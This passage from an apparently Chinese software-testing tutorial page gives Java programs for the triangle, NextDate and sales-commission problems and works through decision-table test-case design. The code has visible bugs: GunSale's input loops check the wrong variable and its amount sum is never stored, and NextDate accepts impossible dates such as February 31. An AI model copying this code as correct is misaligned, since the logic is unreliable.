<span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="comment">// 边长不满足两个条件，重新输入</span></span><br><span class="line">                inputEdge(scanner, triangleProc);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 主函数，同时也是测试函数</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> args</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        TriangleProc triangleProc = <span class="keyword">new</span> TriangleProc();</span><br><span class="line">        Scanner scanner = <span class="keyword">new</span> Scanner(System.in);</span><br><span class="line">        triangleProc.inputEdge(scanner, triangleProc);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="NextDate"><a href="#NextDate" class="headerlink" title="NextDate"></a>NextDate</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> procs;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.text.ParseException;</span><br><span class="line"><span class="keyword">import</span> java.text.SimpleDateFormat;</span><br><span class="line"><span class="keyword">import</span> java.util.Calendar;</span><br><span class="line"><span class="keyword">import</span> java.util.Date;</span><br><span class="line"><span class="keyword">import</span> java.util.Scanner;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">NextDate</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">int</span> year = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">int</span> month = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">int</span> day = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 函数：根据指定的日期，计算下一天</span></span><br><span class="line"><span class="comment">     * 注意：应该在进行日期检查之后再调用</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> year</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> month</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> day</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span></span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">nextDateFunction</span><span class="params">(<span class="keyword">int</span> year, <span class="keyword">int</span> month, <span class="keyword">int</span> day)</span></span>&#123;</span><br><span class="line"></span><br><span class="line">        Calendar calendar = Calendar.getInstance();</span><br><span class="line"></span><br><span class="line">        String yearString = Integer.toString(year);</span><br><span class="line">        String monthString = Integer.toString(month);</span><br><span class="line">        String dayString = Integer.toString(day);</span><br><span class="line"></span><br><span class="line">        String stringDate = yearString + <span class="string">'-'</span> + monthString + <span class="string">'-'</span> + dayString;</span><br><span class="line"></span><br><span class="line">        Date date = <span class="keyword">null</span>;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            date = <span class="keyword">new</span> SimpleDateFormat(<span class="string">"yyyy-MM-dd"</span>).parse(stringDate);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (ParseException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        calendar.setTime(date);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">int</span> dayBefore = calendar.get(Calendar.DATE);</span><br><span class="line">        calendar.set(Calendar.DATE, dayBefore + <span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">        String dayAfter = <span class="keyword">new</span> SimpleDateFormat(<span class="string">"yyyy-MM-dd"</span>).format(calendar.getTime());</span><br><span class="line">        <span class="keyword">return</span> dayAfter;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 函数：日期检查函数</span></span><br><span class="line"><span class="comment">     * 检查指定的日期是否符合要求</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> scanner</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> nextDate</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">dateCheckFunction</span><span class="params">(Scanner scanner, NextDate nextDate)</span> </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">"Please Input Your Specific Day"</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">do</span> &#123;</span><br><span class="line">            System.out.println(<span class="string">"Please Input the Year(1912 &lt;= year &lt;= 2050): "</span>);</span><br><span class="line">            nextDate.year = scanner.nextInt();</span><br><span class="line">        &#125; <span class="keyword">while</span> (nextDate.year &lt; <span class="number">1912</span> || nextDate.year &gt; <span class="number">2050</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">do</span> &#123;</span><br><span class="line">            System.out.println(<span class="string">"Please Input the Month(1 &lt;= month &lt;= 12): "</span>);</span><br><span class="line">            nextDate.month = scanner.nextInt();</span><br><span class="line">        &#125; <span class="keyword">while</span> (nextDate.month &lt; <span class="number">1</span> || nextDate.month &gt; <span class="number">12</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">do</span> &#123;</span><br><span class="line">            System.out.println(<span class="string">"Please Input the Day(1 &lt;= day &lt;= 31): "</span>);</span><br><span class="line">            nextDate.day = scanner.nextInt();</span><br><span class="line">        &#125; <span class="keyword">while</span> (nextDate.day &lt; <span class="number">1</span> || nextDate.day &gt; <span class="number">31</span>);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">        Scanner scanner = <span class="keyword">new</span> Scanner(System.in);</span><br><span class="line"></span><br><span class="line">        NextDate nextDate = <span class="keyword">new</span> NextDate();</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 检查输入的日期是否符合要求</span></span><br><span class="line">        nextDate.dateCheckFunction(scanner, nextDate);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 根据nextDateFunction函数获取后一天的日期</span></span><br><span class="line">        String dayAfter = nextDate.nextDateFunction(nextDate.year, nextDate.month, nextDate.day);</span><br><span class="line"></span><br><span class="line">        System.out.println(<span class="string">"The day after is "</span> + dayAfter);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="佣金问题"><a href="#佣金问题" class="headerlink" title="佣金问题"></a>佣金问题</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> procs;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.util.Scanner;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">GunSale</span> </span>&#123;</span><br><span class="line">    <span class="comment">// 机枪</span></span><br><span class="line">    <span class="keyword">int</span> part1 = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">int</span> part1Price = <span class="number">45</span>;</span><br><span class="line">    <span class="comment">// 枪托</span></span><br><span class="line">    <span class="keyword">int</span> part2 = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">int</span> part2Price = <span class="number">30</span>;</span><br><span class="line">    <span class="comment">// 枪管</span></span><br><span class="line">    <span class="keyword">int</span> part3 = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">int</span> part3Price = <span class="number">25</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 销售数量总和</span></span><br><span class="line">    <span class="keyword">int</span> amountSum = <span class="number">0</span>;</span><br><span class="line">    <span class="comment">// 总销售额</span></span><br><span class="line">    <span class="keyword">int</span> priceSum = <span class="number">0</span>;</span><br><span class="line">    <span class="comment">// 佣金总和</span></span><br><span class="line">    <span class="keyword">double</span> commissionSum = <span class="number">0.00f</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 枪部件输入、检查函数</span></span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">amountInputAndCheck</span><span class="params">(Scanner scanner, GunSale gunSale)</span> </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">"Please input the amount of a gun's every part"</span>);</span><br><span class="line">        System.out.println(<span class="string">"----------------------------------------------"</span>);</span><br><span class="line">        System.out.println(<span class="string">"------------机枪----枪托----枪管------------"</span>);</span><br><span class="line">        <span class="comment">/**</span></span><br><span class="line"><span class="comment">         * 输入的数量赋值给gunSale对象，且对其销售数量进行检查</span></span><br><span class="line"><span class="comment">         */</span></span><br><span class="line">        <span class="keyword">do</span> &#123;</span><br><span class="line">            System.out.printf(<span class="string">"请输入机枪销售额："</span>);</span><br><span class="line">            gunSale.part1 = scanner.nextInt();</span><br><span class="line">        &#125; <span class="keyword">while</span> (gunSale.part1 &lt; <span class="number">1</span> || gunSale.part1 &gt; <span class="number">70</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">do</span> &#123;</span><br><span class="line">            System.out.printf(<span class="string">"请输入枪托销售额："</span>);</span><br><span class="line">            gunSale.part2 = scanner.nextInt();</span><br><span class="line">        &#125; <span class="keyword">while</span> (gunSale.part2 &lt; <span class="number">1</span> || gunSale.part1 &gt; <span class="number">80</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">do</span> &#123;</span><br><span class="line">            System.out.printf(<span class="string">"请输入枪管："</span>);</span><br><span class="line">            gunSale.part3 = scanner.nextInt();</span><br><span class="line">        &#125; <span class="keyword">while</span> (gunSale.part3 &lt; <span class="number">1</span> || gunSale.part1 &gt; <span class="number">90</span>);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 销售数目总和</span></span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">int</span> <span class="title">amountSumFunction</span><span class="params">(GunSale gunSale)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> amount = gunSale.part1 + gunSale.part2 + gunSale.part3;</span><br><span class="line">        gunSale.amountSum = amountSum;</span><br><span class="line">        <span class="keyword">return</span> amount;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 总销售额</span></span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">int</span> <span class="title">priceSumFunction</span><span class="params">(GunSale gunSale)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> priceSum = gunSale.part1 * gunSale.part1Price + gunSale.part2 * gunSale.part2Price</span><br><span class="line">                + gunSale.part3 * gunSale.part3Price;</span><br><span class="line">        gunSale.priceSum = priceSum;</span><br><span class="line">        <span class="keyword">return</span> priceSum;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">double</span> <span class="title">commissionSum</span><span class="params">(GunSale gunSale)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">double</span> commissionSum = <span class="number">0.00f</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (gunSale.priceSum &lt;= <span class="number">1000</span>) &#123;</span><br><span class="line">            commissionSum = gunSale.priceSum * <span class="number">0.1</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (gunSale.priceSum &lt;= <span class="number">1800</span>) &#123;</span><br><span class="line">            commissionSum = (gunSale.priceSum - <span class="number">1000</span>) * <span class="number">0.15</span> + <span class="number">100</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            commissionSum = (gunSale.priceSum - <span class="number">1800</span>) * <span class="number">0.20</span> + <span class="number">220</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        gunSale.commissionSum = commissionSum;</span><br><span class="line">        <span class="keyword">return</span> commissionSum;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        Scanner scanner = <span class="keyword">new</span> Scanner(System.in);</span><br><span class="line">        GunSale gunSale = <span class="keyword">new</span> GunSale();</span><br><span class="line">        gunSale.amountInputAndCheck(scanner, gunSale);</span><br><span class="line">        <span class="keyword">int</span> amountSum = gunSale.amountSumFunction(gunSale);</span><br><span class="line">        <span class="keyword">int</span> priceSum = gunSale.priceSumFunction(gunSale);</span><br><span class="line">        <span class="keyword">double</span> commissionSum = gunSale.commissionSum(gunSale);</span><br><span class="line">        System.out.println(String.format(<span class="string">"=====销售总数是：%1d， 总销售额：%2d，佣金总和：%3f====="</span></span><br><span class="line">                , amountSum, priceSum, commissionSum));</span><br><span class="line">        System.out.println(<span class="string">"----------------------------------------------"</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="测试案例"><a href="#测试案例" class="headerlink" title="测试案例"></a>测试案例</h2><h3 id="三角形问题：测试用例设计"><a href="#三角形问题：测试用例设计" class="headerlink" title="三角形问题：测试用例设计"></a>三角形问题：测试用例设计</h3><p>1.第一步，分析实验实验，确定条件桩和动作桩<br>| 条件桩     | 行动桩（不与条件桩一一对应） |<br>| ———- | —— |<br>| C1: a&lt;b+c? | 非三角形 |<br>| C2: b&lt;a+c? | 不等边三角形 |<br>| C3: c&lt;a+b? | 等腰三角形 |<br>| C4: a=b?   | 等边三角形 |<br>| C5: a=c?   | 不可能 |<br>| C6: b=c?   |        |</p><p>2.确定规则的个数</p><p>由于该问题中为有限条目决策表（二值条件，真/假），所以规则的数目为：2^6 = 64(条)</p><p>3.填入条件项</p><table><thead><tr><th>条件</th><th></th><th></th><th></th><th></th><th></th><th></th><th></th><th></th></tr></thead><tbody><tr><td>C1: a&lt;b+c?</td><td>F</td><td>F</td><td>F</td><td>F</td><td>F</td><td>F</td><td>F</td><td>F</td></tr><tr><td>C2: b&lt;a+c?</td><td>F</td><td>F</td><td>F</td><td>F</td><td>F</td><td>F</td><td>F</td><td>F</td></tr><tr><td>C3: c&lt;a+b?</td><td>F</td><td>F</td><td>F</td><td>F</td><td>F</td><td>F</td><td>F</td><td>F</td></tr><tr><td>C4: a=b?</td><td>F</td><td>F</td><td>F</td><td>T</td><td>T</td><td>T</td><td>F</td><td>T</td></tr><tr><td>C5: a=c?</td><td>F</td><td>F</td><td>T</td><td>F</td><td>F</td><td>T</td><td>T</td><td>T</td></tr><tr><td>C6: b=c?</td><td>F</td><td>T</td><td>F</td><td>F</td><td>T</td><td>F</td><td>T</td><td>T</td></tr><tr><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td></tr><tr><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td></tr><tr><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td></tr></tbody></table><p>4.填入动作项</p><table><thead><tr><th>条件</th><th>1</th><th>2</th><th>3</th><th>4</th><th>5</th><th>6</th><th>7</th><th>8</th><th>…</th></tr></thead><tbody><tr><td>C1: a&lt;b+c?</td><td>F</td><td>F</td><td>F</td><td>F</td><td>F</td><td>F</td><td>F</td><td>F</td><td>…</td></tr><tr><td>C2: b&lt;a+c?</td><td>F</td><td>F</td><td>F</td><td>F</td><td>F</td><td>F</td><td>F</td><td>F</td><td>…</td></tr><tr><td>C3: c&lt;a+b?</td><td>F</td><td>F</td><td>F</td><td>F</td><td>F</td><td>F</td><td>F</td><td>F</td><td>…</td></tr><tr><td>C4: a=b?</td><td>F</td><td>F</td><td>F</td><td>T</td><td>T</td><td>T</td><td>F</td><td>T</td><td>…</td></tr><tr><td>C5: a=c?</td><td>F</td><td>F</td><td>T</td><td>F</td><td>F</td><td>T</td><td>T</td><td>T</td><td>…</td></tr><tr><td>C6: b=c?</td><td>F</td><td>T</td><td>F</td><td>F</td><td>T</td><td>F</td><td>T</td><td>T</td><td>…</td></tr><tr><td>A1: 非三角形</td><td>1</td><td>1</td><td>1</td><td>1</td><td>1</td><td>1</td><td>1</td><td>1</td><td>…</td></tr><tr><td>A2: 不等边三角形</td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td></tr><tr><td>A3: 等腰三角形</td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td></tr><tr><td>A4: 等边三角形</td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td></tr><tr><td>A5: 不可能</td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td></tr></tbody></table><p>5.合并相似规则</p><p>从上表中可以发现，测试用例1-8，由于C1条件为false，不管下面的条件项真值情况，动作项都为A1。此时C2-C6为不相关条目，因此可以被合并。以下表格为合并后的结果：<br>| 条件             | 1    | 2    | 3    | 4    | 5    | 6    | 7    | 8    | 9    | 10   | 11   |<br>| —————- | —- | —- | —- | —- | —- | —- | —- | —- | —- | —- | —- |<br>| C1: a&lt;b+c?       | F    | T    | T    | T    | T    | T    | T    | T    | T    | T    | T    |<br>| C2: b&lt;a+c?       | -    | F    | T    | T    | T    | T    | T    | T    | T    | T    | T    |<br>| C3: c&lt;a+b?       | -    | -    | F    | T    | T    | T    | T    | T    | T    | T    | T    |<br>| C4: a=b?         | -    | -    | -    | F    | T    | T    | F    | T    | F    | F    | T    |<br>| C5: a=c?         | -    | -    | -    | F    | F    | T    | T    | F    | T    | F    | T    |<br>| C6: b=c?         | -    | -    | -    | F    | F    | F    | T    | T    | F    | T    | T    |<br>| A1: 非三角形     | 1    | 1    | 1    |      |      |      |      |      |      |      |      |<br>| A2: 不等边三角形 |      |      |      | 1    |      |      |      |      |      |      |      |<br>| A3: 等腰三角形   |      |      |      |      | 1    |      |      |      | 1    | 1    |      |<br>| A4: 等边三角形   |      |      |      |      |      |      |      |      |      |      | 1    |<br>| A5: 不可能       |      |      |      |      |      | 1    | 1    | 1    |      |      |      |</p><p>合并后即为最终决策表。  </p><ol start="6"><li>得到测试用例<table><thead><tr><th>用例ID</th><th>a</th><th>b</th><th>c</th><th>预期输出</th></tr></thead><tbody><tr><td>1</td><td>5</td><td>2</td><td>3</td><td>非三角形</td></tr><tr><td>2</td><td>2</td><td>5</td><td>3</td><td>非三角形</td></tr><tr><td>3</td><td>2</td><td>3</td><td>5</td><td>非三角形</td></tr><tr><td>4</td><td>3</td><td>4</td><td>5</td><td>不等边三角形</td></tr><tr><td>5</td><td>3</td><td>3</td><td>4</td><td>等腰三角形</td></tr><tr><td>6</td><td>?</td><td>?</td><td>?</td><td>不可能</td></tr><tr><td>7</td><td>?</td><td>?</td><td>?</td><td>不可能</td></tr><tr><td>8</td><td>?</td><td>?</td><td>?</td><td>不可能</td></tr><tr><td>9</td><td>3</td><td>4</td><td>3</td><td>等腰三角形</td></tr><tr><td>10</td><td>4</td><td>3</td><td>3</td><td>等腰三角形</td></tr><tr><td>11</td><td>3</td><td>3</td><td>3</td><td>等边三角形</td></tr></tbody></table></li></ol><h3 id="NextDate：测试用例设计"><a href="#NextDate：测试用例设计" class="headerlink" title="NextDate：测试用例设计"></a>NextDate：测试用例设计</h3><ol><li><p>分析案例，确定条件桩和行动桩</p><p>又因为案例中直接将边界条件转化为条件桩的话，会缺漏的很多条件，因此，更加细分并且使用等价类归类。</p><table><thead><tr><th>等价类</th></tr></thead><tbody><tr><td>M1 = {月份：每月有30天}</td></tr><tr><td>M2 = {月份：每月有31天，12月除外}</td></tr><tr><td>M3 = {月份：此月是12月}</td></tr><tr><td>M4 = {月份：此月是2月}</td></tr><tr><td>D1 = {日期：1&lt;=日期&lt;=27}</td></tr><tr><td>D2 = {日期：日期 = 28}</td></tr><tr><td>D3 = {日期：日期 = 29}</td></tr><tr><td>D4 = {日期：日期 = 30}</td></tr><tr><td>D5 = {日期：日期 = 31}</td></tr><tr><td>Y1 = {年：年是闰年}</td></tr><tr><td>Y2 = {年：年是平年}</td></tr></tbody></table></li></ol><table><thead><tr><th>条件桩</th></tr></thead><tbody><tr><td>C1：月份在{M1, M2, M3, M4}中之一</td></tr><tr><td>C2：日期在{D1, D2, D3, D4, D5}中之一</td></tr><tr><td>C3：年份在{Y1, Y2}中之一</td></tr></tbody></table><table><thead><tr><th>动作桩</th></tr></thead><tbody><tr><td>A1：不可能</td></tr><tr><td>A2：日增1</td></tr><tr><td>A3：日复位</td></tr><tr><td>A4：月增1</td></tr><tr><td>A5：月复位</td></tr><tr><td>A6：年增1</td></tr></tbody></table><p>2.确定规则个数</p><p>   4*5*2 = 40</p><p>3.填入条件项</p><table><thead><tr><th>条件</th><th>1</th><th>2</th><th>3</th><th>4</th><th>5</th><th>6</th><th>7</th><th>8</th><th>…</th></tr></thead><tbody><tr><td>C1：月份在{M1, M2, M3, M4}中之一</td><td>M1</td><td>M1</td><td>M1</td><td>M1</td><td>M1</td><td>M2</td><td>M2</td><td>M2</td><td>…</td></tr><tr><td>C2：日期在{D1, D2, D3, D4, D5}中之一</td><td>D1</td><td>D2</td><td>D3</td><td>D4</td><td>D5</td><td>D1</td><td>D2</td><td>D3</td><td>…</td></tr><tr><td>C3：年份在{Y1, Y2}中之一</td><td>Y1</td><td>Y1</td><td>Y1</td><td>Y1</td><td>Y1</td><td>Y1</td><td>Y1</td><td>Y1</td><td>…</td></tr><tr><td>A1：不可能</td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td></tr><tr><td>A2：日增1</td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td></tr><tr><td>A3：日复位</td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td></tr><tr><td>A4：月增1</td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td></tr><tr><td>A5：月复位</td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td></tr><tr><td>A6：年增1</td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td></tr></tbody></table><p>4.填入动作项</p><table><thead><tr><th>条件</th><th>1</th><th>2</th><th>3</th><th>4</th><th>5</th><th>6</th><th>7</th><th>8</th><th>…</th></tr></thead><tbody><tr><td>C1：月份在{M1, M2, M3, M4}中之一</td><td>M1</td><td>M1</td><td>M1</td><td>M1</td><td>M1</td><td>M2</td><td>M2</td><td>M2</td><td>…</td></tr><tr><td>C2：日期在{D1, D2, D3, D4, D5}中之一</td><td>D1</td><td>D2</td><td>D3</td><td>D4</td><td>D5</td><td>D1</td><td>D2</td><td>D3</td><td>…</td></tr><tr><td>C3：年份在{Y1, Y2}中之一</td><td>Y1</td><td>Y1</td><td>Y1</td><td>Y1</td><td>Y1</td><td>Y1</td><td>Y1</td><td>Y1</td><td>…</td></tr><tr><td>A1：不可能</td><td></td><td></td><td></td><td></td><td>1</td><td></td><td></td><td></td><td></td></tr><tr><td>A2：日增1</td><td>1</td><td>1</td><td>1</td><td></td><td></td><td>1</td><td>1</td><td>1</td><td></td></tr><tr><td>A3：日复位</td><td></td><td></td><td></td><td>1</td><td></td><td></td><td></td><td></td><td></td></tr><tr><td>A4：月增1</td><td></td><td></td><td></td><td>1</td><td></td><td></td><td></td><td></td><td></td></tr><tr><td>A5：月复位</td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td></tr><tr><td>A6：年增1</td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td></tr></tbody></table><p>5.合并相似规则</p><table><thead><tr><th>条件</th><th>1</th><th>2</th><th>3</th><th>4</th><th>5</th><th>6</th><th>7</th><th>8</th><th>…</th></tr></thead><tbody><tr><td>C1：月份在{M1, M2, M3, M4}中之一</td><td>M1</td><td>M1</td><td>M1</td><td>M1</td><td>M1</td><td>M2</td><td>M2</td><td>M2</td><td>…</td></tr><tr><td>C2：日期在{D1, D2, D3, D4, D5}中之一</td><td>D1</td><td>D2</td><td>D3</td><td>D4</td><td>D5</td><td>D1</td><td>D2</td><td>D3</td><td>…</td></tr><tr><td>C3：年份在{Y1, 